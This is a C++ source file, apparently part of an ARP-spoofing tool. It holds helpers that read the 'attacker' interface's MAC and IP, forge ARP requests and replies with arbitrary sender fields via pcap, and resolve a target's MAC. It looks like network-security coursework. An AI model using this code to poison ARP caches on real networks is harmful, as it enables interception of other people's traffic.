#include "arp-spoof.h"

void getAttackerInfo(string interface, Mac& attackerMac, Ip& attackerIp ) {
    //get Mac Address
    ifstream fp ("/sys/class/net/" + interface + "/address");
    string macaddr;
    fp >> macaddr;
    fp.close();
    attackerMac = macaddr;

    // get IP Address
    int s = socket(AF_INET, SOCK_DGRAM, 0);
    ifreq ifr;
    ifr.ifr_addr.sa_family = AF_INET;
    strncpy(ifr.ifr_name, interface.c_str(), IFNAMSIZ -1);

    ioctl(s, SIOCGIFADDR, &ifr);

    string ipaddr = inet_ntoa(((sockaddr_in *) &ifr.ifr_addr) -> sin_addr);
    attackerIp = Ip(ipaddr);

}

void sendARPPacket(pcap_t* handle, Mac& eth_dmac, Mac& eth_smac, Mac& arp_smac, Ip& arp_sip, Mac& arp_tmac, Ip& arp_tip, bool isRequest ){

	EthArpPacket packet;

	packet.eth_.dmac_ = eth_dmac;
	packet.eth_.smac_ = eth_smac;
	packet.eth_.type_ = htons(EthHdr::Arp);

	packet.arp_.hrd_ = htons(ArpHdr::ETHER);
	packet.arp_.pro_ = htons(EthHdr::Ip4);
	packet.arp_.hln_ = Mac::SIZE;
	packet.arp_.pln_ = Ip::SIZE;
	packet.arp_.op_ = isRequest ? htons(ArpHdr::Request) : htons(ArpHdr::Reply);
	packet.arp_.smac_ = arp_smac;
	packet.arp_.sip_ = htonl(arp_sip);
	packet.arp_.tmac_ = arp_tmac;
	packet.arp_.tip_ = htonl(arp_tip);

	int res = pcap_sendpacket(handle, reinterpret_cast<const u_char*>(&packet), sizeof(EthArpPacket));
	if (res != 0) {
		fprintf(stderr, "pcap_sendpacket return %d error=%s\n", res, pcap_geterr(handle));
	}
}

void getMACAddress(pcap_t* handle, Mac& senderMac, Ip& senderIp, Mac& attackerMac, Ip& attackerIp) {
    Mac broadcastMac = Mac("FF:FF:FF:FF:FF:FF");
    Mac nullMac = Mac("00:00:00:00:00:00");
    
    sendARPPacket(handle, broadcastMac, senderMac, attackerMac, attackerIp, nullMac, senderIp, true );

    while(true){
        struct pcap_pkthdr* header;
        const u_char* packet;
        int res = pcap_next_ex(handle, &header, &packet);
        
        if (res == 0) continue;

        EthArpPacket* ethArpPacket = (EthArpPacket*)packet;
        if(ethArpPacket->eth_.type() == EthHdr::Arp && ethArpPacket->arp_.op() == ArpHdr::Reply && ethArpPacket->arp_.sip() == senderIp && ethArpPacket->arp_.tip() == attackerIp){
            senderMac = ethArpPacket->arp_.smac();
            break;
        }
    }
}
